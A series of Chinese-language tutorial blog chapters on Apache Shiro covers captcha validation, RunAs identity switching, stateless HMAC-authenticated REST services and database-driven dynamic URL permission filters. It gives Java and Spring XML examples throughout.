        response.setHeader("Cache-Control", "no-store, no-cache, must-revalidate");
        response.addHeader("Cache-Control", "post-check=0, pre-check=0");
        response.setHeader("Pragma", "no-cache");
        response.setContentType("image/jpeg");
        String id = request.getRequestedSessionId();
        BufferedImage bi = JCaptcha.captchaService.getImageChallengeForID(id);
        ServletOutputStream out = response.getOutputStream();
        ImageIO.write(bi, "jpg", out);
        try {
            out.flush();
        } finally {
            out.close();
        }
    }
} 
CaptchaService使用当前会话ID当作key获取相应的验证码图片；另外需要设置响应内容不进行浏览器端缓存。 
 
<!-- 验证码过滤器需要放到Shiro之后 因为Shiro将包装HttpSession 如果不，可能造成两次的sesison id 不一样 -->
<filter>
  <filter-name>JCaptchaFilter</filter-name>
  <filter-class> 
    com.github.zhangkaitao.shiro.chapter22.jcaptcha.JCaptchaFilter
  </filter-class>
  </filter>
  <filter-mapping>
    <filter-name>JCaptchaFilter</filter-name>
    <url-pattern>/jcaptcha.jpg</url-pattern>
</filter-mapping> 
这样就可以在页面使用/jcaptcha.jpg地址显示验证码图片。
 
六、JCaptchaValidateFilter
用于验证码验证的Shiro过滤器。  
public class JCaptchaValidateFilter extends AccessControlFilter {
    private boolean jcaptchaEbabled = true;//是否开启验证码支持
    private String jcaptchaParam = "jcaptchaCode";//前台提交的验证码参数名
    private String failureKeyAttribute = "shiroLoginFailure"; //验证失败后存储到的属性名
    public void setJcaptchaEbabled(boolean jcaptchaEbabled) {
        this.jcaptchaEbabled = jcaptchaEbabled;
    }
    public void setJcaptchaParam(String jcaptchaParam) {
        this.jcaptchaParam = jcaptchaParam;
    }
    public void setFailureKeyAttribute(String failureKeyAttribute) {
        this.failureKeyAttribute = failureKeyAttribute;
    }
    protected boolean isAccessAllowed(ServletRequest request, ServletResponse response, Object mappedValue) throws Exception {
        //1、设置验证码是否开启属性，页面可以根据该属性来决定是否显示验证码
        request.setAttribute("jcaptchaEbabled", jcaptchaEbabled);
        HttpServletRequest httpServletRequest = WebUtils.toHttp(request);
        //2、判断验证码是否禁用 或不是表单提交（允许访问）
        if (jcaptchaEbabled == false || !"post".equalsIgnoreCase(httpServletRequest.getMethod())) {
            return true;
        }
        //3、此时是表单提交，验证验证码是否正确
        return JCaptcha.validateResponse(httpServletRequest, httpServletRequest.getParameter(jcaptchaParam));
    }
    protected boolean onAccessDenied(ServletRequest request, ServletResponse response) throws Exception {
        //如果验证码失败了，存储失败key属性
        request.setAttribute(failureKeyAttribute, "jCaptcha.error");
        return true;
    }
}
 
七、MyFormAuthenticationFilter
用于验证码验证的Shiro拦截器在用于身份认证的拦截器之前运行；但是如果验证码验证拦截器失败了，就不需要进行身份认证拦截器流程了；所以需要修改下如FormAuthenticationFilter身份认证拦截器，当验证码验证失败时不再走身份认证拦截器。 
public class MyFormAuthenticationFilter extends FormAuthenticationFilter {
    protected boolean onAccessDenied(ServletRequest request, ServletResponse response, Object mappedValue) throws Exception {
        if(request.getAttribute(getFailureKeyAttribute()) != null) {
            return true;
        }
        return super.onAccessDenied(request, response, mappedValue);
    }
} 
即如果之前已经错了，那直接跳过即可。
 
八、spring-config-shiro.xml       
<!-- 基于Form表单的身份验证过滤器 -->
<bean id="authcFilter" 
  class="com.github.zhangkaitao.shiro.chapter22.jcaptcha.MyFormAuthenticationFilter">
    <property name="usernameParam" value="username"/>
    <property name="passwordParam" value="password"/>
    <property name="rememberMeParam" value="rememberMe"/>
    <property name="failureKeyAttribute" value="shiroLoginFailure"/>
</bean>
<bean id="jCaptchaValidateFilter" 
  class="com.github.zhangkaitao.shiro.chapter22.jcaptcha.JCaptchaValidateFilter">
    <property name="jcaptchaEbabled" value="true"/>
    <property name="jcaptchaParam" value="jcaptchaCode"/>
    <property name="failureKeyAttribute" value="shiroLoginFailure"/>
</bean>
<!-- Shiro的Web过滤器 -->
<bean id="shiroFilter" class="org.apache.shiro.spring.web.ShiroFilterFactoryBean">
    <property name="securityManager" ref="securityManager"/>
    <property name="loginUrl" value="/login"/>
    <property name="filters">
        <util:map>
            <entry key="authc" value-ref="authcFilter"/>
            <entry key="sysUser" value-ref="sysUserFilter"/>
            <entry key="jCaptchaValidate" value-ref="jCaptchaValidateFilter"/>
        </util:map>
    </property>
    <property name="filterChainDefinitions">
        <value>
            /static/** = anon
            /jcaptcha* = anon
            /login = jCaptchaValidate,authc
            /logout = logout
            /authenticated = authc
            /** = user,sysUser
        </value>
    </property>
</bean>
 
九、login.jsp登录页面
<c:if test="${jcaptchaEbabled}">
    验证码：
    <input type="text" name="jcaptchaCode">
<img class="jcaptcha-btn jcaptcha-img" 
src="${pageContext.request.contextPath}/jcaptcha.jpg" title="点击更换验证码">
    <a class="jcaptcha-btn" href="javascript:;">换一张</a>
    <br/>
</c:if> 
根据jcaptchaEbabled来显示验证码图片。
 
十、测试
输入http://localhost:8080/chapter22将重定向到登录页面；输入正确的用户名/密码/验证码即可成功登录，如果输入错误的验证码，将显示验证码错误页面： 
  
 
 
示例源代码：https://github.com/zhangkaitao/shiro-example；可加群 231889722 探讨Spring/Shiro技术。
        
  
已有 2 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
第二十一章 授予身份及切换身份——《跟我学Shiro》, jinnianshilongnian.iteye.com.blog.2044616, Mon, 14 Apr 2014 08:31:42 +0800

 
目录贴： 跟我学Shiro目录贴
 
在一些场景中，比如某个领导因为一些原因不能进行登录网站进行一些操作，他想把他网站上的工作委托给他的秘书，但是他不想把帐号/密码告诉他秘书，只是想把工作委托给他；此时和我们可以使用Shiro的RunAs功能，即允许一个用户假装为另一个用户（如果他们允许）的身份进行访问。
 
本章代码基于《第十六章 综合实例》，请先了解相关数据模型及基本流程后再学习本章。
 
表及数据SQL
请运行shiro-example-chapter21/sql/ shiro-schema.sql 表结构
请运行shiro-example-chapter21/sql/ shiro-schema.sql 数据
 
实体
 
具体请参考com.github.zhangkaitao.shiro.chapter21包下的实体。
public class UserRunAs implements Serializable {
    private Long fromUserId;//授予身份帐号
    private Long toUserId;//被授予身份帐号
} 
该实体定义了授予身份帐号（A）与被授予身份帐号（B）的关系，意思是B帐号将可以假装为A帐号的身份进行访问。
 
DAO
具体请参考com.github.zhangkaitao.shiro.chapter21.dao包下的DAO接口及实现。
 
Service
具体请参考com.github.zhangkaitao.shiro.chapter21.service包下的Service接口及实现。 
public interface UserRunAsService {
    public void grantRunAs(Long fromUserId, Long toUserId);
    public void revokeRunAs(Long fromUserId, Long toUserId);
    public boolean exists(Long fromUserId, Long toUserId);
    public List<Long> findFromUserIds(Long toUserId);
    public List<Long> findToUserIds(Long fromUserId);
} 
提供授予身份、回收身份、关系存在判断及查找API。
 
Web控制器RunAsController
该控制器完成：授予身份/回收身份/切换身份功能。
 
展示当前用户能切换到身份列表，及授予给其他人的身份列表：
@RequestMapping
public String runasList(@CurrentUser User loginUser, Model model) {
    model.addAttribute("fromUserIds", 
        userRunAsService.findFromUserIds(loginUser.getId()));
    model.addAttribute("toUserIds", userRunAsService.findToUserIds(loginUser.getId()));
    List<User> allUsers = userService.findAll();
    allUsers.remove(loginUser);
    model.addAttribute("allUsers", allUsers);
    Subject subject = SecurityUtils.getSubject();
    model.addAttribute("isRunas", subject.isRunAs());
    if(subject.isRunAs()) {
        String previousUsername =
                (String)subject.getPreviousPrincipals().getPrimaryPrincipal();
        model.addAttribute("previousUsername", previousUsername);
    }
    return "runas";
} 
1、Subject.isRunAs()：表示当前用户是否是RunAs用户，即已经切换身份了；
2、Subject.getPreviousPrincipals()：得到切换身份之前的身份，一个用户可以切换很多次身份，之前的身份使用栈数据结构来存储；
 
授予身份
把当前用户身份授予给另一个用户，这样另一个用户可以切换身份到该用户。
@RequestMapping("/grant/{toUserId}")
public String grant(
        @CurrentUser User loginUser,
        @PathVariable("toUserId") Long toUserId,
        RedirectAttributes redirectAttributes) {
    if(loginUser.getId().equals(toUserId)) {
        redirectAttributes.addFlashAttribute("msg", "自己不能切换到自己的身份");
        return "redirect:/runas";
    }
    userRunAsService.grantRunAs(loginUser.getId(), toUserId);
    redirectAttributes.addFlashAttribute("msg", "操作成功");
    return "redirect:/runas";
} 
1、自己不能授予身份给自己；
2、调用UserRunAsService. grantRunAs把当前登录用户的身份授予给相应的用户；
 
回收身份
把授予给某个用户的身份回收回来。 
@RequestMapping("/revoke/{toUserId}")
public String revoke(
        @CurrentUser User loginUser,
        @PathVariable("toUserId") Long toUserId,
        RedirectAttributes redirectAttributes) {
    userRunAsService.revokeRunAs(loginUser.getId(), toUserId);
    redirectAttributes.addFlashAttribute("msg", "操作成功");
    return "redirect:/runas";
}
  
 
切换身份
@RequestMapping("/switchTo/{switchToUserId}")
public String switchTo(
        @CurrentUser User loginUser,
        @PathVariable("switchToUserId") Long switchToUserId,
        RedirectAttributes redirectAttributes) {
    Subject subject = SecurityUtils.getSubject();
    User switchToUser = userService.findOne(switchToUserId);
    if(loginUser.equals(switchToUser)) {
        redirectAttributes.addFlashAttribute("msg", "自己不能切换到自己的身份");
        return "redirect:/runas";
    }
    if(switchToUser == null || !userRunAsService.exists(switchToUserId, loginUser.getId())) {
        redirectAttributes.addFlashAttribute("msg", "对方没有授予您身份，不能切换");
        return "redirect:/runas";
    }
    subject.runAs(new SimplePrincipalCollection(switchToUser.getUsername(), ""));
    redirectAttributes.addFlashAttribute("msg", "操作成功");
    redirectAttributes.addFlashAttribute("needRefresh", "true");
    return "redirect:/runas";
}
 
1、首先根据switchToUserId查找到要切换到的身份；
2、然后通过UserRunAsService. exists()判断当前登录用户是否可以切换到该身份；
3、通过Subject.runAs()切换到该身份；
 
切换到上一个身份 
@RequestMapping("/switchBack")
public String switchBack(RedirectAttributes redirectAttributes) {
    Subject subject = SecurityUtils.getSubject();
    if(subject.isRunAs()) {
       subject.releaseRunAs();
    }
    redirectAttributes.addFlashAttribute("msg", "操作成功");
    redirectAttributes.addFlashAttribute("needRefresh", "true");
    return "redirect:/runas";
} 
1、通过Subject.releaseRunAs()切换会上一个身份；
 
 
此处注意的是我们可以切换多次身份，如A切换到B，然后再切换到C；那么需要调用两次Subject. releaseRunAs()才能切换会A；即内部使用栈数据结构存储着切换过的用户；Subject. getPreviousPrincipals()得到上一次切换到的身份，比如当前是C；那么调用该API将得到B的身份。
 
其他代码和配置和《第十六章 综合实例》一样，请参考该章。
 
测试
1、首先访问http://localhost:8080/chapter21/，输入admin/123456进行登录；会看到如下界面： 
 
2、点击切换身份按钮，跳到如下界面：   
在该界面可以授权身份给其他人（点击授权身份可以把自己的身份授权给其他人/点击回收身份可以把之前授予的身份撤回）、或切换到其他身份（即假装为其他身份运行）；
 
3、点击切换到该身份按钮，切换到相应的身份运行，如： 
此时zhang用户切换到admin身份；如果点击切换回该身份，会把当前身份切换会zhang。
 
    
 
示例源代码：https://github.com/zhangkaitao/shiro-example；可加群 231889722 探讨Spring/Shiro技术。
        
  
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
第二十章 无状态Web应用集成——《跟我学Shiro》, jinnianshilongnian.iteye.com.blog.2041909, Tue, 08 Apr 2014 08:39:48 +0800

 
目录贴： 跟我学Shiro目录贴
 
在一些环境中，可能需要把Web应用做成无状态的，即服务器端无状态，就是说服务器端不会存储像会话这种东西，而是每次请求时带上相应的用户名进行登录。如一些REST风格的API，如果不使用OAuth2协议，就可以使用如REST+HMAC认证进行访问。HMAC（Hash-based Message Authentication Code）：基于散列的消息认证码，使用一个密钥和一个消息作为输入，生成它们的消息摘要。注意该密钥只有客户端和服务端知道，其他第三方是不知道的。访问时使用该消息摘要进行传播，服务端然后对该消息摘要进行验证。如果只传递用户名+密码的消息摘要，一旦被别人捕获可能会重复使用该摘要进行认证。解决办法如：
1、每次客户端申请一个Token，然后使用该Token进行加密，而该Token是一次性的，即只能用一次；有点类似于OAuth2的Token机制，但是简单些；
2、客户端每次生成一个唯一的Token，然后使用该Token加密，这样服务器端记录下这些Token，如果之前用过就认为是非法请求。
 
为了简单，本文直接对请求的数据（即全部请求的参数）生成消息摘要，即无法篡改数据，但是可能被别人窃取而能多次调用。解决办法如上所示。
  
服务器端
对于服务器端，不生成会话，而是每次请求时带上用户身份进行认证。
  
服务控制器
@RestController
public class ServiceController {
    @RequestMapping("/hello")
    public String hello1(String[] param1, String param2) {
        return "hello" + param1[0] + param1[1] + param2;
    }
} 
当访问/hello服务时，需要传入param1、param2两个请求参数。
 
加密工具类
com.github.zhangkaitao.shiro.chapter20.codec.HmacSHA256Utils： 
//使用指定的密码对内容生成消息摘要（散列值）
public static String digest(String key, String content);
//使用指定的密码对整个Map的内容生成消息摘要（散列值）
public static String digest(String key, Map<String, ?> map) 
对Map生成消息摘要主要用于对客户端/服务器端来回传递的参数生成消息摘要。
  
Subject工厂  
public class StatelessDefaultSubjectFactory extends DefaultWebSubjectFactory {
    public Subject createSubject(SubjectContext context) {
        //不创建session
        context.setSessionCreationEnabled(false);
        return super.createSubject(context);
    }
} 
通过调用context.setSessionCreationEnabled(false)表示不创建会话；如果之后调用Subject.getSession()将抛出DisabledSessionException异常。
 
StatelessAuthcFilter
类似于FormAuthenticationFilter，但是根据当前请求上下文信息每次请求时都要登录的认证过滤器。
public class StatelessAuthcFilter extends AccessControlFilter {
  protected boolean isAccessAllowed(ServletRequest request, ServletResponse response, Object mappedValue) throws Exception {
      return false;
  }
  protected boolean onAccessDenied(ServletRequest request, ServletResponse response) throws Exception {
    //1、客户端生成的消息摘要
    String clientDigest = request.getParameter(Constants.PARAM_DIGEST);
    //2、客户端传入的用户身份
String username = request.getParameter(Constants.PARAM_USERNAME);
    //3、客户端请求的参数列表
    Map<String, String[]> params = 
      new HashMap<String, String[]>(request.getParameterMap());
    params.remove(Constants.PARAM_DIGEST);
    //4、生成无状态Token
    StatelessToken token = new StatelessToken(username, params, clientDigest);
    try {
      //5、委托给Realm进行登录
      getSubject(request, response).login(token);
    } catch (Exception e) {
      e.printStackTrace();
      onLoginFail(response); //6、登录失败
      return false;
    }
    return true;
  }
  //登录失败时默认返回401状态码
  private void onLoginFail(ServletResponse response) throws IOException {
    HttpServletResponse httpResponse = (HttpServletResponse) response;
    httpResponse.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
    httpResponse.getWriter().write("login error");
  }
}
 
获取客户端传入的用户名、请求参数、消息摘要，生成StatelessToken；然后交给相应的Realm进行认证。
 
StatelessToken   
public class StatelessToken implements AuthenticationToken {
    private String username;
    private Map<String, ?> params;
    private String clientDigest;
    //省略部分代码
    public Object getPrincipal() {  return username;}
    public Object getCredentials() {  return clientDigest;}
} 
用户身份即用户名；凭证即客户端传入的消息摘要。
 
StatelessRealm 
用于认证的Realm。
public class StatelessRealm extends AuthorizingRealm {
    public boolean supports(AuthenticationToken token) {
        //仅支持StatelessToken类型的Token
        return token instanceof StatelessToken;
    }
    protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principals) {
        //根据用户名查找角色，请根据需求实现
        String username = (String) principals.getPrimaryPrincipal();
        SimpleAuthorizationInfo authorizationInfo =  new SimpleAuthorizationInfo();
        authorizationInfo.addRole("admin");
        return authorizationInfo;
    }
    protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) throws AuthenticationException {
        StatelessToken statelessToken = (StatelessToken) token;
        String username = statelessToken.getUsername();
        String key = getKey(username);//根据用户名获取密钥（和客户端的一样）
        //在服务器端生成客户端参数消息摘要
        String serverDigest = HmacSHA256Utils.digest(key, statelessToken.getParams());
        //然后进行客户端消息摘要和服务器端消息摘要的匹配
        return new SimpleAuthenticationInfo(
                username,
                serverDigest,
                getName());
    }
    
    private String getKey(String username) {//得到密钥，此处硬编码一个
        if("admin".equals(username)) {
            return "dadadswdewq2ewdwqdwadsadasd";
        }
        return null;
    }
} 
此处首先根据客户端传入的用户名获取相应的密钥，然后使用密钥对请求参数生成服务器端的消息摘要；然后与客户端的消息摘要进行匹配；如果匹配说明是合法客户端传入的；否则是非法的。这种方式是有漏洞的，一旦别人获取到该请求，可以重复请求；可以考虑之前介绍的解决方案。
 
Spring配置——spring-config-shiro.xml 
<!-- Realm实现 -->
<bean id="statelessRealm" 
  class="com.github.zhangkaitao.shiro.chapter20.realm.StatelessRealm">
    <property name="cachingEnabled" value="false"/>
</bean>
<!-- Subject工厂 -->
<bean id="subjectFactory" 
  class="com.github.zhangkaitao.shiro.chapter20.mgt.StatelessDefaultSubjectFactory"/>
<!-- 会话管理器 -->
<bean id="sessionManager" class="org.apache.shiro.session.mgt.DefaultSessionManager">
    <property name="sessionValidationSchedulerEnabled" value="false"/>
</bean>
<!-- 安全管理器 -->
<bean id="securityManager" class="org.apache.shiro.web.mgt.DefaultWebSecurityManager">
    <property name="realm" ref="statelessRealm"/>
    <property name="subjectDAO.sessionStorageEvaluator.sessionStorageEnabled"
      value="false"/>
    <property name="subjectFactory" ref="subjectFactory"/>
    <property name="sessionManager" ref="sessionManager"/>
</bean>
<!-- 相当于调用SecurityUtils.setSecurityManager(securityManager) -->
<bean class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
    <property name="staticMethod" 
      value="org.apache.shiro.SecurityUtils.setSecurityManager"/>
    <property name="arguments" ref="securityManager"/>
</bean> 
sessionManager通过sessionValidationSchedulerEnabled禁用掉会话调度器，因为我们禁用掉了会话，所以没必要再定期过期会话了。 
 
<bean id="statelessAuthcFilter" 
    class="com.github.zhangkaitao.shiro.chapter20.filter.StatelessAuthcFilter"/> 
每次请求进行认证的拦截器。 
 
<!-- Shiro的Web过滤器 -->
<bean id="shiroFilter" class="org.apache.shiro.spring.web.ShiroFilterFactoryBean">
    <property name="securityManager" ref="securityManager"/>
    <property name="filters">
        <util:map>
            <entry key="statelessAuthc" value-ref="statelessAuthcFilter"/>
        </util:map>
    </property>
    <property name="filterChainDefinitions">
        <value>
            /**=statelessAuthc
        </value>
    </property>
</bean> 
所有请求都将走statelessAuthc拦截器进行认证。
 
其他配置请参考源代码。
 
SpringMVC学习请参考：
5分钟构建spring web mvc REST风格HelloWorld
  http://jinnianshilongnian.iteye.com/blog/1996071
跟我学SpringMVC
  http://www.iteye.com/blogs/subjects/kaitao-springmvc
 
客户端
此处使用SpringMVC提供的RestTemplate进行测试。请参考如下文章进行学习：
Spring MVC测试框架详解——客户端测试
   http://jinnianshilongnian.iteye.com/blog/2007180
Spring MVC测试框架详解——服务端测试 
   http://jinnianshilongnian.iteye.com/blog/2004660
 
此处为了方便，使用内嵌jetty服务器启动服务端： 
public class ClientTest {
    private static Server server;
    private RestTemplate restTemplate = new RestTemplate();
    @BeforeClass
    public static void beforeClass() throws Exception {
        //创建一个server
        server = new Server(8080);
        WebAppContext context = new WebAppContext();
        String webapp = "shiro-example-chapter20/src/main/webapp";
        context.setDescriptor(webapp + "/WEB-INF/web.xml");  //指定web.xml配置文件
        context.setResourceBase(webapp);  //指定webapp目录
        context.setContextPath("/");
        context.setParentLoaderPriority(true);
        server.setHandler(context);
        server.start();
    }
    @AfterClass
    public static void afterClass() throws Exception {
        server.stop(); //当测试结束时停止服务器
    }
} 
在整个测试开始之前开启服务器，整个测试结束时关闭服务器。
 
测试成功情况 
@Test
public void testServiceHelloSuccess() {
    String username = "admin";
    String param11 = "param11";
    String param12 = "param12";
    String param2 = "param2";
    String key = "dadadswdewq2ewdwqdwadsadasd";
    MultiValueMap<String, String> params = new LinkedMultiValueMap<String, String>();
    params.add(Constants.PARAM_USERNAME, username);
    params.add("param1", param11);
    params.add("param1", param12);
    params.add("param2", param2);
    params.add(Constants.PARAM_DIGEST, HmacSHA256Utils.digest(key, params));
    String url = UriComponentsBuilder
            .fromHttpUrl("http://localhost:8080/hello")
            .queryParams(params).build().toUriString();
     ResponseEntity responseEntity = restTemplate.getForEntity(url, String.class);
    Assert.assertEquals("hello" + param11 + param12 + param2, responseEntity.getBody());
} 
对请求参数生成消息摘要后带到参数中传递给服务器端，服务器端验证通过后访问相应服务，然后返回数据。
 
测试失败情况 
@Test
public void testServiceHelloFail() {
    String username = "admin";
    String param11 = "param11";
    String param12 = "param12";
    String param2 = "param2";
    String key = "dadadswdewq2ewdwqdwadsadasd";
    MultiValueMap<String, String> params = new LinkedMultiValueMap<String, String>();
    params.add(Constants.PARAM_USERNAME, username);
    params.add("param1", param11);
    params.add("param1", param12);
    params.add("param2", param2);
    params.add(Constants.PARAM_DIGEST, HmacSHA256Utils.digest(key, params));
    params.set("param2", param2 + "1");
    String url = UriComponentsBuilder
            .fromHttpUrl("http://localhost:8080/hello")
            .queryParams(params).build().toUriString();
    try {
        ResponseEntity responseEntity = restTemplate.getForEntity(url, String.class);
    } catch (HttpClientErrorException e) {
        Assert.assertEquals(HttpStatus.UNAUTHORIZED, e.getStatusCode());
        Assert.assertEquals("login error", e.getResponseBodyAsString());
    }
} 
在生成请求参数消息摘要后，篡改了参数内容，服务器端接收后进行重新生成消息摘要发现不一样，报401错误状态码。
 
到此，整个测试完成了，需要注意的是，为了安全性，请考虑本文开始介绍的相应解决方案。
 
 
SpringMVC相关知识请参考
5分钟构建spring web mvc REST风格HelloWorld
  http://jinnianshilongnian.iteye.com/blog/1996071
跟我学SpringMVC
  http://www.iteye.com/blogs/subjects/kaitao-springmvc
Spring MVC测试框架详解——客户端测试
   http://jinnianshilongnian.iteye.com/blog/2007180
Spring MVC测试框架详解——服务端测试 
   http://jinnianshilongnian.iteye.com/blog/2004660
        
 
示例源代码：https://github.com/zhangkaitao/shiro-example；可加群 231889722 探讨Spring/Shiro技术。
        
  
已有 2 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
第十九章 动态URL权限控制——《跟我学Shiro》, jinnianshilongnian.iteye.com.blog.2040929, Fri, 04 Apr 2014 08:40:15 +0800

 
目录贴： 跟我学Shiro目录贴
 
用过Spring Security的朋友应该比较熟悉对URL进行全局的权限控制，即访问URL时进行权限匹配；如果没有权限直接跳到相应的错误页面。Shiro也支持类似的机制，不过需要稍微改造下来满足实际需求。不过在Shiro中，更多的是通过AOP进行分散的权限控制，即方法级别的；而通过URL进行权限控制是一种集中的权限控制。本章将介绍如何在Shiro中完成动态URL权限控制。
 
本章代码基于《第十六章 综合实例》，请先了解相关数据模型及基本流程后再学习本章。
 
表及数据SQL
请运行shiro-example-chapter19/sql/ shiro-schema.sql 表结构
请运行shiro-example-chapter19/sql/ shiro-schema.sql 数据
 
实体
具体请参考com.github.zhangkaitao.shiro.chapter19包下的实体。 
public class UrlFilter implements Serializable {
    private Long id;
    private String name; //url名称/描述
    private String url; //地址
    private String roles; //所需要的角色，可省略
    private String permissions; //所需要的权限，可省略
} 
表示拦截的URL和角色/权限之间的关系，多个角色/权限之间通过逗号分隔，此处还可以扩展其他的关系，另外可以加如available属性表示是否开启该拦截。
 
DAO
具体请参考com.github.zhangkaitao.shiro.chapter19.dao包下的DAO接口及实现。
 
Service
具体请参考com.github.zhangkaitao.shiro.chapter19.service包下的Service接口及实现。  
public interface UrlFilterService {
    public UrlFilter createUrlFilter(UrlFilter urlFilter);
    public UrlFilter updateUrlFilter(UrlFilter urlFilter);
    public void deleteUrlFilter(Long urlFilterId);
    public UrlFilter findOne(Long urlFilterId);
    public List<UrlFilter> findAll();
}
基本的URL拦截的增删改查实现。 
 
@Service
public class UrlFilterServiceImpl implements UrlFilterService {
    @Autowired
private ShiroFilerChainManager shiroFilerChainManager;
    @Override
    public UrlFilter createUrlFilter(UrlFilter urlFilter) {
        urlFilterDao.createUrlFilter(urlFilter);
        initFilterChain();
        return urlFilter;
    }
    //其他方法请参考源码
    @PostConstruct
    public void initFilterChain() {
        shiroFilerChainManager.initFilterChains(findAll());
    }
} 
UrlFilterServiceImpl在进行新增、修改、删除时会调用initFilterChain来重新初始化Shiro的URL拦截器链，即同步数据库中的URL拦截器定义到Shiro中。此处也要注意如果直接修改数据库是不会起作用的，因为只要调用这几个Service方法时才同步。另外当容器启动时会自动回调initFilterChain来完成容器启动后的URL拦截器的注册。
  
ShiroFilerChainManager 
@Service
public class ShiroFilerChainManager {
    @Autowired private DefaultFilterChainManager filterChainManager;
    private Map<String, NamedFilterList> defaultFilterChains;
    @PostConstruct
    public void init() {
        defaultFilterChains = 
          new HashMap<String, NamedFilterList>(filterChainManager.getFilterChains());
    }
    public void initFilterChains(List<UrlFilter> urlFilters) {
        //1、首先删除以前老的filter chain并注册默认的
        filterChainManager.getFilterChains().clear();
        if(defaultFilterChains != null) {
            filterChainManager.getFilterChains().putAll(defaultFilterChains);
        }
        //2、循环URL Filter 注册filter chain
        for (UrlFilter urlFilter : urlFilters) {
            String url = urlFilter.getUrl();
            //注册roles filter
            if (!StringUtils.isEmpty(urlFilter.getRoles())) {
                filterChainManager.addToChain(url, "roles", urlFilter.getRoles());
            }
            //注册perms filter
            if (!StringUtils.isEmpty(urlFilter.getPermissions())) {
                filterChainManager.addToChain(url, "perms", urlFilter.getPermissions());
            }
        }
    }
} 
1、init：Spring容器启动时会调用init方法把在spring配置文件中配置的默认拦截器保存下来，之后会自动与数据库中的配置进行合并。
2、initFilterChains：UrlFilterServiceImpl会在Spring容器启动或进行增删改UrlFilter时进行注册URL拦截器到Shiro。
 
拦截器及拦截器链知识请参考《第八章 拦截器机制》，此处再介绍下Shiro拦截器的流程：
AbstractShiroFilter //如ShiroFilter/ SpringShiroFilter都继承该Filter
   doFilter //Filter的doFilter
     doFilterInternal //转调doFilterInternal
       executeChain(request, response, chain) //执行拦截器链
         FilterChain chain = getExecutionChain(request, response, origChain) //使用原始拦截器链获取新的拦截器链
           chain.doFilter(request, response) //执行新组装的拦截器链
 
getExecutionChain(request, response, origChain) //获取拦截器链流程
       FilterChainResolver resolver = getFilterChainResolver(); //获取相应的FilterChainResolver
       FilterChain resolved = resolver.getChain(request, response, origChain); //通过FilterChainResolver根据当前请求解析到新的FilterChain拦截器链
 
默认情况下如使用ShiroFilterFactoryBean创建shiroFilter时，默认使用PathMatchingFilterChainResolver进行解析，而它默认是根据当前请求的URL获取相应的拦截器链，使用Ant模式进行URL匹配；默认使用DefaultFilterChainManager进行拦截器链的管理。
 
PathMatchingFilterChainResolver默认流程：
public FilterChain getChain(ServletRequest request, ServletResponse response, FilterChain originalChain) {
    //1、首先获取拦截器链管理器
    FilterChainManager filterChainManager = getFilterChainManager();
    if (!filterChainManager.hasChains()) {
        return null;
    }
    //2、接着获取当前请求的URL（不带上下文）
    String requestURI = getPathWithinApplication(request);
    //3、循环拦截器管理器中的拦截器定义（拦截器链的名字就是URL模式）
    for (String pathPattern : filterChainManager.getChainNames()) {
        //4、如当前URL匹配拦截器名字（URL模式）
        if (pathMatches(pathPattern, requestURI)) {
            //5、返回该URL模式定义的拦截器链
            return filterChainManager.proxy(originalChain, pathPattern);
        }
    }
    return null;
} 
默认实现有点小问题：
如果多个拦截器链都匹配了当前请求URL，那么只返回第一个找到的拦截器链；后续我们可以修改此处的代码，将多个匹配的拦截器链合并返回。
 
DefaultFilterChainManager内部使用Map来管理URL模式-拦截器链的关系；也就是说相同的URL模式只能定义一个拦截器链，不能重复定义；而且如果多个拦截器链都匹配时是无序的（因为使用map.keySet()获取拦截器链的名字，即URL模式）。
 
FilterChainManager接口： 
public interface FilterChainManager {
    Map<String, Filter> getFilters(); //得到注册的拦截器
    void addFilter(String name, Filter filter); //注册拦截器
    void addFilter(String name, Filter filter, boolean init); //注册拦截器
    void createChain(String chainName, String chainDefinition); //根据拦截器链定义创建拦截器链
    void addToChain(String chainName, String filterName); //添加拦截器到指定的拦截器链
    void addToChain(String chainName, String filterName, String chainSpecificFilterConfig) throws ConfigurationException; //添加拦截器（带有配置的）到指定的拦截器链
    NamedFilterList getChain(String chainName); //获取拦截器链
    boolean hasChains(); //是否有拦截器链
    Set<String> getChainNames(); //得到所有拦截器链的名字
    FilterChain proxy(FilterChain original, String chainName); //使用指定的拦截器链代理原始拦截器链
} 
此接口主要三个功能：注册拦截器，注册拦截器链，对原始拦截器链生成代理之后的拦截器链，比如  
<bean id="shiroFilter" class="org.apache.shiro.spring.web.ShiroFilterFactoryBean">
……
    <property name="filters">
        <util:map>
            <entry key="authc" value-ref="formAuthenticationFilter"/>
            <entry key="sysUser" value-ref="sysUserFilter"/>
        </util:map>
    </property>
    <property name="filterChainDefinitions">
        <value>
            /login = authc
            /logout = logout
            /authenticated = authc
            /** = user,sysUser
        </value>
    </property>
</bean> 
filters属性定义了拦截器；filterChainDefinitions定义了拦截器链；如/**就是拦截器链的名字；而user,sysUser就是拦截器名字列表。
 
之前说过默认的PathMatchingFilterChainResolver和DefaultFilterChainManager不能满足我们的需求，我们稍微扩展了一下：
  
CustomPathMatchingFilterChainResolver 
public class CustomPathMatchingFilterChainResolver
             extends PathMatchingFilterChainResolver {
  private CustomDefaultFilterChainManager customDefaultFilterChainManager;
  public void setCustomDefaultFilterChainManager(
        CustomDefaultFilterChainManager customDefaultFilterChainManager) {
      this.customDefaultFilterChainManager = customDefaultFilterChainManager;
      setFilterChainManager(customDefaultFilterChainManager);
  }
  public FilterChain getChain(ServletRequest request, ServletResponse response, FilterChain originalChain) {
      FilterChainManager filterChainManager = getFilterChainManager();
      if (!filterChainManager.hasChains()) {
          return null;
      }
      String requestURI = getPathWithinApplication(request);
      List<String> chainNames = new ArrayList<String>();
      for (String pathPattern : filterChainManager.getChainNames()) {
        if (pathMatches(pathPattern, requestURI)) {
        chainNames.add(pathPattern);
        }
      }
      if(chainNames.size() == 0) {
        return null;
      }
      return customDefaultFilterChainManager.proxy(originalChain, chainNames);
  }
} 
和默认的PathMatchingFilterChainResolver区别是，此处得到所有匹配的拦截器链，然后通过调用CustomDefaultFilterChainManager.proxy(originalChain, chainNames)进行合并后代理。
 
